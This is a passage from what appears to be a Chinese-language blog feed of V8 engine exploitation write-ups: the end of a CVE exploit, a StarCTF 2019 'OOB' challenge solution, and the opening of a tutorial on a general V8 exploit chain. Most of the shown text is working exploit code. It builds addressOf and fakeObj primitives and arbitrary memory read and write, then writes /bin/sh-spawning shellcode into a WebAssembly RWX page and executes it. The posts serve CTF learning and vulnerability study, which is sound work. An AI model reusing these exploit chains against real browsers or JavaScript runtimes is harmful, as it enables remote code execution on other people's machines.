class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br>&#123;<br>  f64[<span class="hljs-number">0</span>] = f;<br>    <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    bigUint64[<span class="hljs-number">0</span>] = i;<br>    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObj</span>(<span class="hljs-params">addr_to_fake</span>)<br>&#123;<br>    double_array[<span class="hljs-number">0</span>] = <span class="hljs-title function_">itof</span>(addr_to_fake + <span class="hljs-number">1n</span>);<br>    double_array[<span class="hljs-number">1</span>] = obj_map;<br>    <span class="hljs-keyword">let</span> faked_obj = double_array[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> faked_obj;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj_to_leak</span>)<br>&#123;<br>    obj_array[<span class="hljs-number">0</span>] = obj_to_leak;<br>    double_array[<span class="hljs-number">8</span>] = array_map;<br>    <span class="hljs-keyword">let</span> obj_addr = <span class="hljs-title function_">ftoi</span>(obj_array[<span class="hljs-number">0</span>]) - <span class="hljs-number">1n</span>;<br>    double_array[<span class="hljs-number">8</span>] = obj_map;<br>    <span class="hljs-keyword">return</span> obj_addr;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)<br>&#123;<br>    fake_array[<span class="hljs-number">1</span>] = <span class="hljs-title function_">itof</span>(addr - <span class="hljs-number">0x8n</span> + <span class="hljs-number">0x1n</span>);<br>    <span class="hljs-keyword">return</span> fake_object[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr, data</span>)<br>&#123;<br>    fake_array[<span class="hljs-number">1</span>] = <span class="hljs-title function_">itof</span>(addr - <span class="hljs-number">0x8n</span> + <span class="hljs-number">0x1n</span>);<br>    fake_object[<span class="hljs-number">0</span>] = <span class="hljs-title function_">itof</span>(data);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode_to_rwx</span>(<span class="hljs-params">shellcode, rwx_addr</span>)<br>&#123;<br>  <span class="hljs-keyword">var</span> data_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(shellcode.<span class="hljs-property">length</span> * <span class="hljs-number">8</span>);<br>  <span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_lo = <span class="hljs-title function_">addressOf</span>(data_buf) + <span class="hljs-number">0x10n</span>;<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_up = buf_backing_store_addr_lo + <span class="hljs-number">0x8n</span>;<br>  <span class="hljs-keyword">var</span> lov = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_lo))[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_lo = <span class="hljs-title function_">u2d</span>(lov, <span class="hljs-title function_">d2u</span>(rwx_addr)[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">var</span> hiv = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_up))[<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_hi = <span class="hljs-title function_">u2d</span>(<span class="hljs-title function_">d2u</span>(rwx_addr, hiv)[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr = <span class="hljs-title function_">ftoi</span>(<span class="hljs-title function_">u2d</span>(lov, hiv));<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] buf_backing_store_addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(buf_backing_store_addr));<br><br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_lo, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_lo));<br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_up, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_hi));<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.<span class="hljs-property">length</span>; ++i)<br>    data_view.<span class="hljs-title function_">setFloat64</span>(i * <span class="hljs-number">8</span>, <span class="hljs-title function_">itof</span>(shellcode[i]), <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">array, oob</span>) &#123;<br>  <span class="hljs-keyword">var</span> x = array.<span class="hljs-property">length</span>;<br>  x -= <span class="hljs-number">67108861</span>; <span class="hljs-comment">// 1 2</span><br>  x *= <span class="hljs-number">10</span>; <span class="hljs-comment">// 10 20</span><br>  x -= <span class="hljs-number">9</span>; <span class="hljs-comment">// 1 11</span><br>  oob[x] = length_as_double; <span class="hljs-comment">// fake length</span><br>&#125;<br><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30000</span>; ++i) &#123;<br>  vul = [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.1</span>];<br>  pad = [vul];<br>  double_array = [<span class="hljs-number">3.1</span>];<br>  obj = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">2.1</span>&#125;;<br>  obj_array = [obj];<br>  <span class="hljs-title function_">trigger</span>(giant_array, vul);<br>&#125;<br><br><span class="hljs-keyword">var</span> array_map = double_array[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">var</span> obj_map = double_array[<span class="hljs-number">8</span>];<br><br><span class="hljs-keyword">var</span> fake_array = [<br>  array_map,<br>  <span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)<br>];<br><br>fake_array_addr = <span class="hljs-title function_">addressOf</span>(fake_array);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak fake_array addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(fake_array_addr));<br>fake_object_addr = fake_array_addr + <span class="hljs-number">0x48n</span>;<br><span class="hljs-keyword">var</span> fake_object = <span class="hljs-title function_">fakeObj</span>(fake_object_addr);<br><span class="hljs-keyword">var</span> wasm_instance_addr = <span class="hljs-title function_">addressOf</span>(wasmInstance);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak wasm_instance addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(wasm_instance_addr));<br><span class="hljs-keyword">var</span> rwx_page_addr = <span class="hljs-title function_">read64</span>(wasm_instance_addr + <span class="hljs-number">0x68n</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(<span class="hljs-title function_">ftoi</span>(rwx_page_addr)));<br><br><span class="hljs-keyword">var</span> shellcode = [<br>  <span class="hljs-number">0x2fbb485299583b6an</span>,<br>  <span class="hljs-number">0x5368732f6e69622fn</span>,<br>  <span class="hljs-number">0x050f5e5457525f54n</span><br>];<br><br><span class="hljs-title function_">copy_shellcode_to_rwx</span>(shellcode, rwx_page_addr);<br><span class="hljs-title function_">f</span>();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019 starctf OOB</title>
    <link href="/2023/04/13/starctf-2019-OOB/"/>
    <url>/2023/04/13/starctf-2019-OOB/</url>
    
    <content type="html"><![CDATA[<p>实战但没完全实战</p><span id="more"></span><h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>（由于不会看C++源码而跳过漏洞分析的我就是个屑o(TヘTo)）<br>在obb.diff中，给变量添加了一个oob函数，存在off by one可以越界读写64bit，test.js如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br>&#123;<br>  f64[<span class="hljs-number">0</span>] = f;<br>  <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    bigUint64[<span class="hljs-number">0</span>] = i;<br>    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">var</span> a = [<span class="hljs-number">2.1</span>];<br><span class="hljs-keyword">var</span> x = a.<span class="hljs-title function_">oob</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;x is 0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">ftoi</span>(x)));<br>%<span class="hljs-title class_">DebugPrint</span>(a);<br>%<span class="hljs-title class_">SystemBreak</span>();<br>a.<span class="hljs-title function_">oob</span>(<span class="hljs-number">2.1</span>);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>DebugPrint的内容如下：</p><img src="/2023/04/13/starctf-2019-OOB/output.png" class title="output"><p>变量a的结构如下：</p><img src="/2023/04/13/starctf-2019-OOB/a.png" class title="a"><p>地址没有压缩，可以看出a.oob()打印出了map的地址<br>继续执行，a.oob(2.1)后的a的内存布局是这样的：</p><img src="/2023/04/13/starctf-2019-OOB/change.png" class title="change"><p>a的map被改成了2.1</p><h1 id="套模板编写exp"><a href="#套模板编写exp" class="headerlink" title="套模板编写exp"></a>套模板编写exp</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//64位浮点数和整数转化相关变量声明</span><br><span class="hljs-comment">//两个对象以不同方式读写一块内存</span><br><span class="hljs-keyword">var</span> f64=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> bigUint64=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><span class="hljs-comment">//任意对象读写相关变量声明</span><br><span class="hljs-keyword">var</span> double_array=[<span class="hljs-number">1.1</span>];<br><span class="hljs-keyword">var</span> obj=&#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>&#125;;<br><span class="hljs-keyword">var</span> obj_array=[obj];<br><span class="hljs-keyword">var</span> double_map=double_array.<span class="hljs-title function_">oob</span>();<br><span class="hljs-keyword">var</span> obj_map=obj_array.<span class="hljs-title function_">oob</span>();<br><br><span class="hljs-comment">//任意读写相关变量声明</span><br><span class="hljs-keyword">var</span> fake_array=[<br>double_map,<span class="hljs-comment">//64bit map addr</span><br><span class="hljs-title function_">itof</span>(<span class="hljs-number">0n</span>),<span class="hljs-comment">//64bit properties addr</span><br><span class="hljs-title function_">itof</span>(<span class="hljs-number">0x41414141n</span>),<span class="hljs-comment">//64bit elements addr</span><br><span class="hljs-title function_">itof</span>(<span class="hljs-number">0x100000000n</span>),<span class="hljs-comment">//64bit length</span><br>];<br><br><span class="hljs-comment">//wasm相关变量声明</span><br><span class="hljs-keyword">var</span> wasmCode=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><span class="hljs-keyword">var</span> wasmModule=<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><span class="hljs-keyword">var</span> wasmInstance=<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule,&#123;&#125;);<br><span class="hljs-keyword">var</span> f=wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><br><span class="hljs-comment">//64位浮点数和整数相互转化</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br>&#123;<br>f64[<span class="hljs-number">0</span>]=f;<br><span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">i</span>)<br>&#123;<br>bigUint64[<span class="hljs-number">0</span>]=i;<br><span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-comment">//十六进制输出</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br>&#123;<br><span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//任意结构体读写</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObj</span>(<span class="hljs-params">addr_to_fake</span>)<br>&#123;<br>    double_array[<span class="hljs-number">0</span>] = <span class="hljs-title function_">itof</span>(addr_to_fake + <span class="hljs-number">1n</span>);<br>    double_array.<span class="hljs-title function_">oob</span>(obj_map);<span class="hljs-comment">//将浮点型数组伪造成对象数组</span><br>    <span class="hljs-keyword">let</span> faked_obj = double_array[<span class="hljs-number">0</span>];<br>    double_array.<span class="hljs-title function_">oob</span>(array_map);<br>    <span class="hljs-keyword">return</span> faked_obj;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj_to_leak</span>)<span class="hljs-comment">//将用array伪造的数据转为object</span><br>&#123;<br>    obj_array[<span class="hljs-number">0</span>] = obj_to_leak;<br>    obj_array.<span class="hljs-title function_">oob</span>(double_map);<span class="hljs-comment">//将对象数组伪造成浮点型数组</span><br>    <span class="hljs-keyword">let</span> obj_addr = <span class="hljs-title function_">ftoi</span>(obj_array[<span class="hljs-number">0</span>]) - <span class="hljs-number">1n</span>;<br>    obj_array.<span class="hljs-title function_">oob</span>(obj_map);<br>    <span class="hljs-keyword">return</span> obj_addr;<br>&#125;<br><br><span class="hljs-comment">//任意读写函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)<br>&#123;<br>fake_array[<span class="hljs-number">2</span>]=<span class="hljs-title function_">itof</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">1n</span>);<br><span class="hljs-keyword">return</span> fake_object[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr,data</span>)<br>&#123;<br>fake_array[<span class="hljs-number">2</span>]=<span class="hljs-title function_">itof</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">1n</span>);<br>fake_object[<span class="hljs-number">0</span>]=<span class="hljs-title function_">itof</span>(data);<br>&#125;<br><br><span class="hljs-comment">//shellcode写如rwx函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode_to_rwx</span>(<span class="hljs-params">shellcode,rwx_addr</span>)<br>&#123;<br><span class="hljs-keyword">var</span> data_buf=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(shellcode.<span class="hljs-property">length</span>*<span class="hljs-number">8</span>);<br><span class="hljs-keyword">var</span> data_view=<span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br><span class="hljs-keyword">var</span> buf_backing_store_addr=<span class="hljs-title function_">addressOf</span>(data_buf)+<span class="hljs-number">0x20n</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] buf_backing_store_addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(buf_backing_store_addr));<br><br><span class="hljs-title function_">write64</span>(buf_backing_store_addr,<span class="hljs-title function_">ftoi</span>(rwx_addr));<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;shellcode.<span class="hljs-property">length</span>;++i)<br>data_view.<span class="hljs-title function_">setFloat64</span>(i*<span class="hljs-number">8</span>,<span class="hljs-title function_">itof</span>(shellcode[i],<span class="hljs-literal">true</span>));<br>&#125;<br><br><span class="hljs-comment">//将用array伪造的fake_object转化为object</span><br>fake_array_addr=<span class="hljs-title function_">addressOf</span>(fake_array);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak fake_array addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(fake_array_addr));<br>fake_object_addr=fake_array_addr+<span class="hljs-number">0x30n</span>;<span class="hljs-comment">//fake_array的elements在+0x30的位置</span><br><span class="hljs-keyword">var</span> fake_object=<span class="hljs-title function_">fakeObj</span>(fake_object_addr);<br><br><span class="hljs-keyword">var</span> wasm_instance_addr=<span class="hljs-title function_">addressOf</span>(wasmInstance);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak wasm_instance addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(wasm_instance_addr));<br><span class="hljs-keyword">var</span> rwx_page_addr=<span class="hljs-title function_">read64</span>(wasm_instance_addr+<span class="hljs-number">0x88</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(<span class="hljs-title function_">ftoi</span>(rwx_page_addr)));<br><br><span class="hljs-keyword">var</span> shellcode=[<br><span class="hljs-number">0x2fbb485299583b6an</span>,<br><span class="hljs-number">0x5368732f6e69622fn</span>,<br><span class="hljs-number">0x050f5e5457525f54n</span><br>];<br><br><span class="hljs-title function_">copy_shellcode_to_rwx</span>(shellcode,rwx_page_addr)<br><span class="hljs-title function_">f</span>();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>V8通用利用链</title>
    <link href="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>（咕咕咕了好久……）基础pwn暂时告一段落了，本来打算开kernel的，但XCTF见到了V8所以研究一下。配环境真坐牢……本来都配好了虚拟机不小心被我玩崩了还没备份(╯▔皿▔)╯还因为一些很屑的原因（少加了双引号(ˉ▽ˉ；)…）又花了好久再配了一遍……<br>ps：目前的学习按照从“0开始学V8漏洞利用”系列进行</p><span id="more"></span><h1 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h1><p>做pwn题的时候我们的目标往往就是执行system(‘&#x2F;bin&#x2F;sh’)，V8利用的目标就是执行任意shellcode，要达成这个目标我们就需要读写相关漏洞+一段rwx的内存<br>wasm可以为我们制造rwx的内存<br>ps：wasm无法执行shellcode（还不清楚为啥，之后再研究），所以直接写shellcode什么的别想了o( ￣▽￣)ブ<br>pps：在别的博客里还有用常规堆题思路做的，之后再研究<br>所以我们的思路就是先生成一段合法的wasm再写入非法的shellcode<br>test.js如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">%<span class="hljs-title class_">SystemBreak</span>();<br><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span 